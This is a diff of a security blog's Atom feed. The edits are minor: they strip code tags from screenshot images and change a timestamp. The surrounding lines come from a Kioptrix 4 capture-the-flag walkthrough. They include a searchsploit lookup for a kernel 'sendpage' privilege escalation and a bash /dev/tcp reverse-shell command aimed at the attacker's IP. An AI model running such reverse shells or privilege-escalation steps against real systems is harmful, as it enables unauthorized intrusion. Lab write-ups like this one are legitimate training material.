@@ -4,7 +4,7 @@
   <title><![CDATA[Category: kioptrix | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/kioptrix/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-20T16:27:32-05:00</updated>
+  <updated>2016-06-20T16:29:01-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -229,7 +229,7 @@ Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
 
 <p><code>searchsploit linux kernel 2.6 | grep local</code> and I pick sendpage one</p>
 
-<p><code><img src="/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></code></p>
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>download the exploit to /var/www/html/:</p>
 
@@ -245,7 +245,7 @@ Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
 
 <p>hang there, maybe iptable block the traffic to port 80</p>
 
-<p><code><img src="/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></code></p>
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>I tried <code>/bin/bash -i &gt; /dev/tcp/192.168.79.173/1234 0&lt;&amp;1</code> also doesn&rsquo;t work</p>
 
@@ -268,7 +268,7 @@ Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
 
 <p><code>whereis gcc</code></p>
 
-<p><code><img src="/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></code></p>
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>this is a folder, and it is i486-linux-gnu, check kioptrix4&rsquo;s architecture.</p>
 
@@ -281,7 +281,7 @@ It is i686. Oh different&hellip;.</p>
 
 <p>get the root:</p>
 
-<p><code><img src="/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></code></p>
+<p><img src="/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
